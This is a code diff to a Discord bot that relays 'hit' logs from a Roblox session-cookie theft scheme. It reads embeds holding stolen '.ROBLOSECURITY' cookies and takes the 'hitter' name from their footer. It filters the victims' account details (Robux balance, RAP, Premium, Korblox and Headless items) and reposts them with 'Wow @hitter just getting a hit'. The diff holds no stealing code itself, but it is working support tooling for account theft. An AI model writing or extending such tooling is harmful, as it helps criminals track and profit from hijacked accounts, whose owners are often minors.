@@ -19,6 +19,22 @@ if (!BOT_TOKEN || !SOURCE_CHANNEL_ID || !TARGET_CHANNEL_ID) {
 }
 // ──────────────────────────────────────────────────────────────────────────────
 
+const SECTION_KEYWORDS = [
+  'Robux', 'Balance', 'Pending',
+  'Summary', 'Rap', 'Owned Item',
+  'Premium', 'Korblox', 'Headless',
+  'korbloxdeath', 'headless', 'korblox',
+];
+
+function extractSections(description) {
+  if (!description) return null;
+  const lines = description.split('\n');
+  const kept = lines.filter(line =>
+    SECTION_KEYWORDS.some(kw => line.toLowerCase().includes(kw.toLowerCase()))
+  );
+  return kept.length > 0 ? kept.join('\n') : null;
+}
+
 client.once('clientReady', () => {
   console.log(`✅ Logged in as ${client.user.tag}`);
   console.log(`👁  Watching: ${SOURCE_CHANNEL_ID}`);
@@ -32,8 +48,26 @@ client.on('messageCreate', async (message) => {
   const targetChannel = await client.channels.fetch(TARGET_CHANNEL_ID).catch(() => null);
   if (!targetChannel) return console.error('❌ Target channel not found.');
 
+  // Step 1: find the hitter name from the cookie embed's footer
+  let hitterName = null;
   for (const embed of message.embeds) {
-    // Skip the .ROBLOSECURITY cookie embed
+    const embedText = [
+      embed.title,
+      embed.description,
+      embed.author?.name,
+      ...(embed.fields?.map(f => f.value) ?? []),
+    ].filter(Boolean).join(' ');
+
+    if (embedText.includes('ROBLOSECURITY') || embedText.includes('WARNING:-DO-NOT-SHARE')) {
+      if (embed.footer?.text) {
+        hitterName = embed.footer.text.trim();
+      }
+      break;
+    }
+  }
+
+  // Step 2: forward the hit data embed (skip cookie embed)
+  for (const embed of message.embeds) {
     const embedText = [
       embed.title,
       embed.description,
@@ -46,15 +80,16 @@ client.on('messageCreate', async (message) => {
       continue;
     }
 
-    // Rebuild the embed (Discord doesn't allow forwarding raw embeds directly)
+    const filteredDesc = extractSections(embed.description);
+    if (!filteredDesc) continue;
+
     const rebuilt = new EmbedBuilder();
+    const intro = hitterName ? `Wow @${hitterName} just getting a hit` : `Wow just getting a hit`;
+    rebuilt.setDescription(`${intro}
 
-    if (embed.title)       rebuilt.setTitle(embed.title);
-    if (embed.description) rebuilt.setDescription(embed.description);
-    if (embed.color)       rebuilt.setColor(embed.color);
-    if (embed.url)         rebuilt.setURL(embed.url);
-    if (embed.timestamp)   rebuilt.setTimestamp(new Date(embed.timestamp));
-
+${filteredDesc}`);
+    if (embed.color)     rebuilt.setColor(embed.color);
+    if (embed.timestamp) rebuilt.setTimestamp(new Date(embed.timestamp));
     if (embed.author) {
       rebuilt.setAuthor({
         name:    embed.author.name    || '',
@@ -62,31 +97,10 @@ client.on('messageCreate', async (message) => {
         url:     embed.author.url     || undefined,
       });
     }
-
-    if (embed.footer) {
-      rebuilt.setFooter({
-        text:    embed.footer.text    || '',
-        iconURL: embed.footer.iconURL || undefined,
-      });
-    }
-
     if (embed.thumbnail?.url) rebuilt.setThumbnail(embed.thumbnail.url);
-    if (embed.image?.url)     rebuilt.setImage(embed.image.url);
 
-    if (embed.fields?.length) {
-      rebuilt.addFields(embed.fields.map(f => ({
-        name:   f.name,
-        value:  f.value,
-        inline: f.inline ?? false,
-      })));
-    }
 
     await targetChannel.send({ embeds: [rebuilt] }).catch(console.error);
-  }
-
-  // Also forward plain content (e.g. @everyone New Hits Logs)
-  if (message.content) {
-    await targetChannel.send(message.content).catch(console.error);
   }
 });
 
